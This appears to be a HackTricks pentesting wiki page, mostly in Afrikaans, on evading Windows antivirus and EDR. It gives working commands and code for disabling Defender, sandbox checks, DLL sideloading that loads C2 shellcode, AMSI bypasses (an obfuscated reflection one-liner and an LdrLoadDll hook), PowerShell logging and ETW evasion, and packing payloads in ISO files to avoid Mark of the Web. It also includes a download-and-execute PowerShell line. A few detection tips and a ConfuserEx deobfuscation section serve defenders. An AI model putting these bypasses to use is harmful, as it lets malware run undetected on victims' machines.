# Antivirus (AV) Omseiling

{{#include ../banners/hacktricks-training.md}}

**Hierdie bladsy is geskryf deur** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): 'n hulpmiddel om Windows Defender te laat ophou werk.
- [no-defender](https://github.com/es3n1n/no-defender): 'n hulpmiddel om Windows Defender te laat ophou werk deur voor te gee 'n ander AV te wees.
- [Skakel Defender uit as jy admin is](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Tans gebruik AV's verskillende metodes om te kyk of 'n lêer kwaadwillig is of nie: static detection, dynamic analysis, en vir die meer gevorderde EDRs, behavioural analysis.

### **Static detection**

Static detection word bereik deur bekende kwaadwillige stringe of bytes in 'n binêre of skrip aan te dui, en ook deur inligting uit die lêer self te onttrek (bv. file description, company name, digital signatures, icon, checksum, ens.). Dit beteken dat die gebruik van bekende publieke tools jou makliker kan laat vasgevang word, aangesien hulle waarskynlik al geanaliseer en as kwaadwillig aangemerk is. Daar is 'n paar maniere om hierdie soort opsporing te omseil:

- **Encryption**

As jy die binêre enkodeer, sal daar geen manier wees vir AV om jou program te ontdek nie, maar jy sal 'n soort loader nodig hê om die program in geheue te ontsleutel en te laat loop.

- **Obfuscation**

Soms hoef jy net 'n paar stringe in jou binêre of skrip te verander om dit deur AV te kry, maar dit kan tydrowend wees, afhangend van wat jy probeer obfuskeer.

- **Custom tooling**

As jy jou eie gereedskap ontwikkel, sal daar geen bekende slegte handtekeninge wees nie, maar dit verg baie tyd en moeite.

> [!TIP]
> 'n Goeie manier om teen Windows Defender se static detection te toets is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Dit deel basies die lêer in verskeie segmente en dwing Defender om elk afsonderlik te scan; op hierdie manier kan dit jou presies sê watter stringe of bytes in jou binêre aangemerk word.

Ek beveel sterk aan dat jy hierdie [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) oor praktiese AV Evasion bekyk.

### **Dynamic analysis**

Dynamic analysis is wanneer die AV jou binêre in 'n sandbox laat loop en na kwaadwillige aktiwiteit kyk (bv. probeer om jou blaaier se wagwoorde te ontsleutel en te lees, 'n minidump op LSASS uit te voer, ens.). Hierdie deel kan 'n bietjie moeiliker wees om mee te werk, maar hier is 'n paar dinge wat jy kan doen om sandboxes te ontduik.

- **Sleep before execution** Afhangend van hoe dit geïmplementeer is, kan dit 'n goeie manier wees om AV se dynamic analysis te omseil. AV's het 'n baie kort tyd om lêers te scan om die gebruiker se werkvloei nie te onderbreek nie, so die gebruik van lang sleeps kan die analise van binêre ontwrig. Die probleem is dat baie AV se sandboxes die sleep net kan oorslaan afhangend van hoe dit geïmplementeer is.
- **Checking machine's resources** Gewoonlik het sandboxes baie min hulpbronne om mee te werk (bv. < 2GB RAM), anders sou hulle die gebruiker se masjien vertraag. Jy kan hier ook baie kreatief wees, byvoorbeeld deur die CPU se temperatuur of selfs die fan speeds na te gaan — nie alles sal in die sandbox geïmplementeer wees nie.
- **Machine-specific checks** As jy 'n gebruiker wil teiken wie se werkstasie by die "contoso.local" domain aangesluit is, kan jy 'n kontrole op die rekenaar se domain doen om te sien of dit met die een wat jy gespesifiseer het ooreenstem; as dit nie ooreenstem nie, kan jou program eenvoudig afsluit.

Dit blyk dat Microsoft Defender se Sandbox computername HAL9TH is, so jy kan vir die computer name in jou malware kyk voordat dit ontplof; as die naam HAL9TH is, beteken dit jy is binne Defender se sandbox, en jy kan jou program laat afsluit.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>bron: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Nog 'n paar regtig goeie wenke van [@mgeeky](https://twitter.com/mariuszbit) vir die teiken van Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev kanaal</p></figcaption></figure>

Soos ons vroeër in hierdie pos gesê het, sal **public tools** uiteindelik **gedetekteer word**, so jy moet jouself 'n vraag vra:

Byvoorbeeld, as jy LSASS wil dump, **moet jy regtig mimikatz gebruik**? Of kan jy 'n ander, minder bekende projek gebruik wat ook LSASS dump?

Die regte antwoord is waarskynlik die laasgenoemde. Neem mimikatz as 'n voorbeeld: dit is waarskynlik een van, zo nie die mees, aangemerkte stukke malware deur AV's en EDRs; al is die projek self fantasties, dit is ook 'n nagmerrie om daarmee te werk om rondom AV's te kom, so soek eerder alternatiewe vir wat jy probeer bereik.

> [!TIP]
> Wanneer jy jou payloads vir omseiling wysig, sorg dat jy die automatic sample submission in Defender afskakel, en asseblief, ernstig, **LAAD NIE NA VIRUSTOTAL OP NIE** as jou doel is om op die lang termyn omseiling te bereik. As jy wil toets of jou payload deur 'n bepaalde AV gedetekteer word, installeer dit op 'n VM, probeer om die automatic sample submission af te skakel, en toets dit daar totdat jy tevrede is met die resultaat.

## EXEs vs DLLs

Waar moontlik, prioritiseer altyd die gebruik van DLLs vir omseiling; uit my ervaring word DLL-lêers gewoonlik baie minder gedetekteer en geanaliseer, so dit is 'n baie eenvoudige truuk om in sekere gevalle opsporing te vermy (as jou payload natuurlik 'n manier het om as 'n DLL te loop).

Soos ons in hierdie beeld kan sien, het 'n DLL Payload van Havoc 'n detectionsyfer van 4/26 op antiscan.me, terwyl die EXE payload 'n 7/26 detectionsyfer het.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me vergelyking van 'n normale Havoc EXE payload teen 'n normale Havoc DLL</p></figcaption></figure>

Nou wys ons 'n paar truuks wat jy met DLL-lêers kan gebruik om baie meer stealthy te wees.

## DLL Sideloading & Proxying

**DLL Sideloading** benut die DLL search order wat deur die loader gebruik word deur beide die slagoffer toepassing en kwaadwillige payload(s) langs mekaar te posisioneer.

Jy kan programme wat vatbaar is vir DLL Sideloading nagaan met [Siofra](https://github.com/Cybereason/siofra) en die volgende powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Hierdie opdrag sal die lys programme wat vatbaar is vir DLL hijacking binne "C:\Program Files\\" en die DLL-lêers wat hulle probeer laai, uitvoer.

Ek beveel sterk aan dat jy **explore DLL Hijackable/Sideloadable programs yourself**, hierdie tegniek is redelik stealthy as dit behoorlik gedoen word, maar as jy openbaar bekende DLL Sideloadable programs gebruik, kan jy maklik gevang word.

Net deur 'n kwaadwillige DLL met die naam wat 'n program verwag om te laai te plaas, sal nie noodwendig jou payload laai nie, omdat die program spesifieke funksies binne daardie DLL verwag; om hierdie probleem reg te stel, gaan ons 'n ander tegniek gebruik wat **DLL Proxying/Forwarding** genoem word.

**DLL Proxying** stuur die oproepe wat 'n program maak vanaf die proxy (en kwaadwillige) DLL na die oorspronklike DLL deur, sodoende die program se funksionaliteit bewaar en dit moontlik maak om die uitvoering van jou payload te hanteer.

Ek gaan die [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projek van [@flangvik](https://twitter.com/Flangvik/) gebruik.

Dit is die stappe wat ek gevolg het:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Die laaste opdrag sal ons 2 lêers gee: 'n DLL-bronkode-sjabloon en die oorspronklike hernoemde DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Dit is die resultate:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Beide ons shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) en die proxy DLL het 'n 0/26 Detection rate op [antiscan.me](https://antiscan.me)! Dit sou ek 'n sukses noem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ek beveel sterk aan dat jy [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) oor DLL Sideloading kyk en ook [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) om meer in-diepte te leer oor wat ons bespreek het.

### Misbruik van Forwarded Exports (ForwardSideLoading)

Windows PE modules kan funksies exporteer wat eintlik "forwarders" is: in plaas daarvan om na kode te wys, bevat die exportinskrywing 'n ASCII-string van die vorm `TargetDll.TargetFunc`. Wanneer 'n caller die export oplos, sal die Windows loader:

- Laai `TargetDll` indien dit nog nie gelaai is nie
- Los `TargetFunc` daarvan op

Belangrike gedrag om te verstaan:
- As `TargetDll` 'n KnownDLL is, word dit vanaf die beskermde KnownDLLs naamruimte voorsien (bv., ntdll, kernelbase, ole32).
- As `TargetDll` nie 'n KnownDLL is nie, word die normale DLL-soekorde gebruik, wat die gids van die module wat die forward resolution doen insluit.

Dit maak 'n indirekte sideloading primitive moontlik: vind 'n signed DLL wat 'n funksie exporteer wat forwarded is na 'n nie-KnownDLL module-naam, en plaas daardie signed DLL saam met 'n attacker-controlled DLL met presies dieselfde naam as die forwarded teikenmodule. Wanneer die forwarded export aangeroep word, los die loader die forward op en laai jou DLL vanaf dieselfde gids, wat jou DllMain uitvoer.

Voorbeeld waargeneem op Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` is nie 'n KnownDLL nie, dus word dit deur die normale soekorde opgelos.

PoC (copy-paste):
1) Kopieer die gesigneerde stelsel-DLL na 'n skryfbare gids
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Plaas 'n kwaadwillige `NCRYPTPROV.dll` in dieselfde gids. 'n Minimale DllMain is genoeg om kode-uitvoering te kry; jy hoef nie die doorgestuurde funksie te implementeer om DllMain te aktiveer nie.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Aktiveer die deurstuur met 'n ondertekende LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Waargenome gedrag:
- rundll32 (signed) loads the side-by-side `keyiso.dll` (signed)
- Terwyl die loader `KeyIsoSetAuditingInterface` oplos, volg die loader die forward na `NCRYPTPROV.SetAuditingInterface`
- Die loader laai dan `NCRYPTPROV.dll` vanaf `C:\test` en voer sy `DllMain` uit
- As `SetAuditingInterface` nie geïmplementeer is nie, sal jy eers 'missing API' fout kry nadat `DllMain` reeds uitgevoer is

Jagwenke:
- Fokus op forwarded exports waar die target module nie 'n KnownDLL is nie. KnownDLLs word opgenoem onder `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Jy kan forwarded exports opsom met tooling soos:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Sien die Windows 11 forwarder-inventaris om na kandidate te soek: https://hexacorn.com/d/apis_fwd.txt

Opsporings-/verdedigingsidees:
- Monitor LOLBins (bv., rundll32.exe) wat ondertekende DLLs vanaf nie-stelselpaadjies laai, gevolg deur die laai van nie-KnownDLLs met dieselfde basisnaam vanaf daardie gids
- Waarsku by proses-/modulekettings soos: `rundll32.exe` → nie-stelsel `keyiso.dll` → `NCRYPTPROV.dll` onder gebruikers-skryfbare paadjies
- Dwing kode-integriteitsbeleid (WDAC/AppLocker) af en weier skryf+uitvoering in toepassingsgidse

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Jy kan Freeze gebruik om jou shellcode op 'n diskrete wyse te laai en uit te voer.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ontduiking is net 'n kat & muisspeletjie; wat vandag werk kan môre ontdek word, moenie net op een hulpmiddel staatmaak nie — indien moontlik, probeer om verskeie evasion-tegnieke te ketting.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Aanvanklik kon AV's slegs **lêers op skyf** skandeer, so as jy op een of ander manier payloads **direk in geheue** kon uitvoer, kon die AV niks doen om dit te voorkom nie, aangesien dit nie genoeg sigbaarheid gehad het.

Die AMSI-funksie is geïntegreer in die volgende Windows-komponente.

- User Account Control, or UAC (elevasie van EXE, COM, MSI, of ActiveX-installasie)
- PowerShell (scripts, interaktiewe gebruik, en dinamiese kode-evaluering)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Dit laat antivirusoplossings toe om skripgedrag te ondersoek deur skripinhoud bloot te lê in 'n vorm wat nie geënkripteer en nie geobfuskeer is nie.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

Ons het geen lêer op skyf neergesit nie, maar is steeds in-geheue opgespoor weens AMSI.

Boonop word C#-kode sedert **.NET 4.8** ook deur AMSI verwerk. Dit raak selfs `Assembly.Load(byte[])` wat gebruik word vir in-memory lading. Daarom word dit aanbeveel om laer weergawes van .NET (soos 4.7.2 of laer) te gebruik vir in-memory uitvoering as jy AMSI wil ontduik.

There are a couple of ways to get around AMSI:

- **Obfuscation**

Since AMSI mainly works with static detections, therefore, modifying the scripts you try to load can be a good way for evading detection.

However, AMSI has the capability of deobfuscating scripts even if it has multiple layers, so obfuscation could be a bad option depending on how it's done. This makes it not-so-straightforward to evade. Although, sometimes, all you need to do is change a couple of variable names and you'll be good, so it depends on how much something has been flagged.

- **AMSI Bypass**

Aangesien AMSI geïmplementeer word deur 'n DLL in die powershell (ook cscript.exe, wscript.exe, ens.) proses te laai, is dit moontlik om dit maklik te manipuleer selfs wanneer jy as 'n ongeprivilegieerde gebruiker werk. As gevolg van hierdie fout in die implementering van AMSI het navorsers verskeie maniere gevind om AMSI-skandering te ontduik.

**Forcing an Error**

Forcing the AMSI initialization to fail (amsiInitFailed) will result that no scan will be initiated for the current process. Originally this was disclosed by [Matt Graeber](https://twitter.com/mattifestation) and Microsoft has developed a signature to prevent wider usage.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles wat nodig was, was een reël powershell code om AMSI onbruikbaar te maak vir die huidige powershell proses. Hierdie reël is natuurlik deur AMSI self gevlag, so 'n paar wysigings is nodig om hierdie tegniek te kan gebruik.

Hier is 'n aangepaste AMSI bypass wat ek van hierdie [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) geneem het.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Hou in gedagte dat dit waarskynlik gemerk sal word sodra hierdie plasing uitkom, dus moet jy geen code publiseer as jou plan is om onopgemerk te bly.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Lees asseblief [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) vir 'n meer gedetailleerde verduideliking.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blokkeer AMSI deur die laai van amsi.dll te voorkom (LdrLoadDll hook)

AMSI word eers geïnitialiseer nadat `amsi.dll` in die huidige proses gelaai is. 'n Robuuste, taalonafhanklike bypass is om 'n user‑mode hook op `ntdll!LdrLoadDll` te plaas wat 'n fout teruggee wanneer die aangevraagde module `amsi.dll` is. As gevolg daarvan laai AMSI nooit en vind geen skanderings vir daardie proses plaas nie.

Implementasie-oorsig (x64 C/C++ pseudokode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Aantekeninge
- Werk oor PowerShell, WScript/CScript en aangepaste loaders heen (alles wat anders AMSI sou laai).
- Kombineer dit met die voering van skripte oor stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) om lang opdragreël-artefakte te vermy.
- Gesien gebruik deur loaders wat via LOLBins uitgevoer word (bv., `regsvr32` wat `DllRegisterServer` aanroep).

Hierdie hulpmiddel [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) genereer ook skripte om AMSI te omseil.

**Verwyder die gedetekteerde handtekening**

Jy kan 'n hulpmiddel soos **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** en **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gebruik om die gedetekteerde AMSI-handtekening uit die geheue van die huidige proses te verwyder. Hierdie hulpmiddel werk deur die geheue van die huidige proses te deursoek vir die AMSI-handtekening en dit dan met NOP-instruksies te oorskryf, wat dit effektief uit die geheue verwyder.

**AV/EDR products that uses AMSI**

Jy kan 'n lys van AV/EDR-produkte wat AMSI gebruik vind in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
As jy PowerShell weergawe 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit skandeer. Jy kan dit doen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging is 'n funksie wat jou in staat stel om alle PowerShell-opdragte wat op 'n stelsel uitgevoer word, te registreer. Dit kan nuttig wees vir ouditering en foutopsporing, maar dit kan ook 'n **probleem vir attackers wat detection wil ontduik** wees.

To bypass PowerShell logging, you can use the following techniques:

- **Disable PowerShell Transcription and Module Logging**: Jy kan 'n tool soos [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) hiervoor gebruik.
- **Use Powershell version 2**: As jy PowerShell version 2 gebruik, sal AMSI nie gelaai word nie, sodat jy jou skripte kan uitvoer sonder dat AMSI dit scan. Doen dit so: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Gebruik [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) om 'n PowerShell-sessie sonder verdediging te spawn (dit is wat `powerpick` van Cobal Strike gebruik).


## Obfuscation

> [!TIP]
> Verskeie obfuscation-tegnieke maak staat op die enkripsie van data, wat die entropy van die binary verhoog en dit vir AVs en EDRs makliker maak om dit te detect. Wees versigtig hiermee en oorweeg om enkripsie slegs op spesifieke sensitiewe of verborge dele van jou kode toe te pas.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Wanneer jy malware ontleed wat ConfuserEx 2 (of kommersiële forks) gebruik, is dit algemeen om verskeie beskermingslae te tref wat dekompilers en sandboxes sal blokkeer. Die onderstaande workflow herstel betroubaar 'n naby‑oorspronklike IL wat daarna na C# gedecompileer kan word in gereedskap soos dnSpy of ILSpy.

1.  Anti-tampering removal – ConfuserEx enkripteer elke *method body* en dekripteer dit in die *module* static constructor (`<Module>.cctor`). Dit patched ook die PE checksum, sodat enige wysiging die binary laat crash. Gebruik **AntiTamperKiller** om die enkripteerde metadata-tabelle te lokaliseer, die XOR-sleutels te herstel en 'n skoon assembly te skryf:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output bevat die 6 anti-tamper parameters (`key0-key3`, `nameHash`, `internKey`) wat nuttig kan wees wanneer jy jou eie unpacker bou.

2.  Symbol / control-flow recovery – voer die *clean* lêer aan **de4dot-cex** (a ConfuserEx-aware fork of de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – kies die ConfuserEx 2 profiel
• de4dot sal control-flow flattening ongedaan maak, oorspronklike namespaces, classes en variable name herstel en konstante strings dekripteer.

3.  Proxy-call stripping – ConfuserEx vervang direkte method calls met light-weight wrappers (a.k.a *proxy calls*) om dekompilasie verder te bemoeilik. Verwyder dit met **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Na hierdie stap behoort jy normale .NET API's te sien soos `Convert.FromBase64String` of `AES.Create()` in plaas van ondoorgrondelike wrapper-funksies (`Class8.smethod_10`, …).

4.  Manual clean-up – voer die resulterende binary in dnSpy uit, soek na groot Base64 blobs of `RijndaelManaged`/`TripleDESCryptoServiceProvider` gebruik om die *werklike* payload te vind. Dikwels berg die malware dit as 'n TLV-gekodeerde byte-array wat binne `<Module>.byte_0` geïnitialiseer is.

Die bogenoemde ketting herstel die uitvoeringsvloei **sonder** dat jy die kwaadwillige monster hoef uit te voer — nuttig wanneer jy op 'n offline workstation werk.

> 🛈  ConfuserEx produseer 'n custom attribute met die naam `ConfusedByAttribute` wat as 'n IOC gebruik kan word om monsters outomaties te triage.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Die doel van hierdie projek is om 'n open-source fork van die [LLVM](http://www.llvm.org/) samestelling-suite te verskaf wat verhoogde sagteware-sekuriteit deur [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) en tamper-proofing kan bied.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstreer hoe om die `C++11/14` taal te gebruik om tydens samestelling obfuscated code te genereer sonder om enige eksterne hulpmiddel te gebruik en sonder om die compiler te wysig.
- [**obfy**](https://github.com/fritzone/obfy): Voeg 'n laag van obfuscated operations by wat gegenereer word deur die C++ template metaprogramming framework, wat die lewe van die persoon wat die toepassing wil crack 'n bietjie moeiliker sal maak.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz is 'n x64 binary obfuscator wat verskeie verskillende pe files kan obfuscate, insluitend: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame is 'n eenvoudige metamorphic code engine vir arbitrêre uitvoerbare lêers.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator is 'n fynkorrelige code obfuscation framework vir LLVM-supported languages wat ROP (return-oriented programming) gebruik. ROPfuscator obfuscates 'n program op die assembly code vlak deur gewone instruksies in ROP chains te transformeer, wat ons natuurlike konsep van normale control flow ondermyn.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt is 'n .NET PE Crypter geskryf in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kan bestaande EXE/DLL na shellcode omskakel en dit dan laai

## SmartScreen & MoTW

Jy het dalk hierdie skerm gesien wanneer jy uitvoerbare lêers vanaf die internet aflaai en dit uitvoer.

Microsoft Defender SmartScreen is 'n sekuriteitsmeganisme wat bedoel is om die eindgebruiker te beskerm teen die uitvoering van moontlik kwaadwillige toepassings.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen werk hoofsaaklik deur 'n reputasie-gebaseerde benadering, wat beteken dat seldsaam afgelaaide toepassings SmartScreen sal aktiveer, wat die eindgebruiker waarsku en verhinder om die lêer uit te voer (alhoewel die lêer steeds uitgevoer kan word deur op More Info -> Run anyway te klik).

**MoTW** (Mark of The Web) is 'n [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) met die naam Zone.Identifier wat outomaties geskep word wanneer lêers vanaf die internet afgelaai word, tesame met die URL waarvandaan dit afgelaai is.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Nagaan van die Zone.Identifier ADS vir 'n lêer wat vanaf die internet afgelaai is.</p></figcaption></figure>

> [!TIP]
> Dit is belangrik om te let dat uitvoerbare lêers wat geteken is met 'n vertroude handtekeningssertifikaat nie SmartScreen sal aktiveer nie.

'n Baie effektiewe manier om te verhoed dat jou payloads die Mark of The Web kry, is om dit in 'n soort houer soos 'n ISO te verpak. Dit gebeur omdat Mark-of-the-Web (MOTW) nie op non NTFS volumes toegepas kan word nie.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) is 'n hulpmiddel wat payloads in uitsethouers verpak om Mark-of-the-Web te ontduik.

Voorbeeldgebruik:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Hier is 'n demo vir die omseiling van SmartScreen deur payloads binne ISO-lêers te verpak met [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) is 'n kragtige logmeganisme in Windows wat toepassings en stelselkomponente toelaat om **gebeurtenisse te registreer**. Dit kan egter ook deur sekuriteitsprodukte gebruik word om kwaadwillige aktiwiteite te monitor en te ontdek.

Soos hoe AMSI gedeaktiveer (omseil) word, is dit ook moontlik om die **`EtwEventWrite`** funksie van die user space-proses onmiddellik terug te laat keer sonder om enige gebeurtenisse te registreer. Dit word gedoen deur die funksie in geheue te patch sodat dit onmiddellik terugkeer, wat ETW-logging vir daardie proses effektief deaktiveer.

Meer inligting vind jy by **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Om C# binaries in geheue te laai is al 'n geruime tyd bekend en dit is steeds 'n uitstekende manier om jou post-exploitation gereedskap te laat loop sonder om deur AV gevang te word.

Aangesien die payload direk in geheue gelaai sal word sonder om disk te raak, hoef ons slegs bekommerd te wees oor die patching van AMSI vir die hele proses.

